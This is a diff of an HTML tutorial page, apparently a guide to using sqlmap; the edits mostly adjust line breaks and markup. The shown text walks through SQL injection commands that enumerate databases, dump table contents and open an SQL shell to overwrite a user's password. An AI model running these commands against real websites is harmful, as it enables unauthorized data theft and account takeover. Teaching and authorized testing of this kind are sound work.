@@ -254,7 +254,7 @@ it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads sp
 
 In the end, it will display the names of the databases, showing them with a [*] in front.<br><br>
 
-<div class="code-box2">[11:08:25] [<span class="username">INFO</span>] the back-end DBMS is MySQL
+<div class="code-box2">[<span class="date">11:08:25<span class="date">] [<span class="username">INFO</span>] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu
 web application technology: PHP 5.6.40, Nginx 1.19.0
 back-end DBMS: MySQL >= 5.6
@@ -318,10 +318,10 @@ It will also ask you if you want to save, in a temporary file, the links for a f
 
 <div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap -m links.txt</div><br>
 
-Also, with sqlmap, we can not only extract tables content but also execute database commands, if the website is vulnerable to SQL Injection. To do this, we use the --sql-shell option. Thus, we can now execute SQL commands without worrying about the correct syntax, which varies depending on how the query is structured, as sqlmap will handle this automatically. We can add new users, modify existing user data, or run any other SQL command we want, depending on the database permissions. At this point, a basic understanding of SQL would be necessary.<br>
+Also, with sqlmap, we can not only extract tables content but also execute database commands, if the website is vulnerable to SQL Injection. To do this, we use the --sql-shell option. Thus, we can now execute SQL commands without worrying about the correct syntax, which varies depending on how the query is structured, as sqlmap will handle this automatically. We can add new users, modify existing user data, or run any other SQL command we want, depending on the database permissions. At this point, a basic understanding of SQL would be necessary.<br><br>
 
 <div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 --sql-shell
-sql-shell> UPDATE users SET password = 'newpassword123' WHERE id = 1; --this command will modify the password of the first user in the table</div><br><br></p>
+sql-shell> UPDATE users SET password = 'newpassword123' WHERE id = 1; --this command will modify the password of the first user in the table</div><br></p>
 
 <b>Recap</b><br>
 
@@ -329,16 +329,16 @@ sql-shell> UPDATE users SET password = 'newpassword123' WHERE id = 1; --this com
 
 We use the -dbs option to retrieve the database names.<br>
 
-<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap <i>link</i> -dbs</div><br><br>
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap <i>link</i> -dbs</div><br>
 
-Once we have its name, we specify the database name with the -D option, followed by -tables to list the tables. 
+Once we have its name, we specify the database name with the -D option, followed by -tables to list the tables.<br>
 
-<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap <i>link</i> -D <i>dbname</i> -tables</div><br><br>
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap <i>link</i> -D <i>dbname</i> -tables</div><br>
 
 After obtaining both the database and table names, we specify the database name with -D atribute and the table name with -T , and then we extract the content with -dump option.<br><br>
 
 
-<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap <i>link</i> -D <i>dbname</i> -T <i>tblname</i> -dump</div><br><br>
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap <i>link</i> -D <i>dbname</i> -T <i>tblname</i> -dump</div><br>
 
 
 It is important to note that just because a link follows the format we discussed in this article, it does not automatically mean it is vulnerable to SQL Injection. It simply indicates that it queries a database. </p><br>
